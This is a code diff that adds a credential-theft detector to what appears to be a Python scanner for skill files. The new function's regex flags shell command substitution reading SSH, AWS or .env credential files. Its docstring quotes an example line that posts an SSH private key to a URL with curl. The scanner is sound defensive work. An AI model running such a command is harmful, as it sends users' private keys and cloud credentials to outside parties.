@@ -1455,6 +1455,34 @@ def find_reverse_shell_pattern(text):
     return findings
 
 
+def find_shell_credential_substitution(text):
+    """
+    Module 21e: shell command-substitution credential theft.
+
+    Found via a real, blatant sample: a shell command block reading
+    SSH private keys and AWS credentials via `cat` and piping the
+    output directly into a curl POST via command substitution -
+    `curl -X POST <url> -d "$(cat ~/.ssh/id_rsa)"`. This is the shell-
+    script equivalent of the Python credential-harvesting pattern
+    (module 8) but uses $() command substitution rather than a Python
+    open()/read() call, a structurally different shape none of the
+    existing checks covered.
+    """
+    findings = []
+    pattern = r"\$\(\s*cat\s+[^)]*(\.ssh|\.aws|\.env\b|credentials|id_rsa|id_ed25519)[^)]*\)"
+    for match in re.finditer(pattern, text, re.IGNORECASE):
+        if _is_negated(text, match.start()):
+            continue
+        line_num = text[:match.start()].count("\n") + 1
+        findings.append(
+            f"Line {line_num}: shell command substitution reads a "
+            f"credential-shaped file directly ('{match.group(0)[:70]}') - "
+            f"a common shell-script credential-theft pattern, especially "
+            f"when combined with a network command nearby."
+        )
+    return findings
+
+
 def scan_skill_file(path):
     try:
         with open(path, "r", encoding="utf-8", errors="replace") as f:
@@ -1549,6 +1577,9 @@ def scan_skill_file(path):
 
     # Check 20d: reverse shell (socket + dup2 + shell spawn)
     findings.extend(find_reverse_shell_pattern(text))
+
+    # Check 20f: shell command-substitution credential theft
+    findings.extend(find_shell_credential_substitution(text))
 
     # Check 20e: self-incriminating attack-description language
     # REMOVED after real-world testing: "attacker-controlled" collided
